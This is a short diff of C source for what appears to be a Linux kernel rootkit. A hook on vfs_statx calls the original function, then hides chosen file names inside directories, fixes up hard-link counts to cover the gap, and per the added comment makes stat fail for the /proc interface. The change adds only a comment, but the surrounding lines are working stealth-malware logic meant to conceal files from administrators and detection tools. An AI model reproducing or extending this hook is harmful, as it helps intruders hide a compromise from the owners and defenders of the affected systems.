@@ -1017,6 +1017,11 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
     /* call original first, I want stat */
     long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
+    /** handle two distinct operations
+     *  1   If is directory, look for hidden file names
+     *      and update hard-links counter accordingly.
+     *  2   make stat fail for /proc interface.
+     * */
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
         if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
             int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
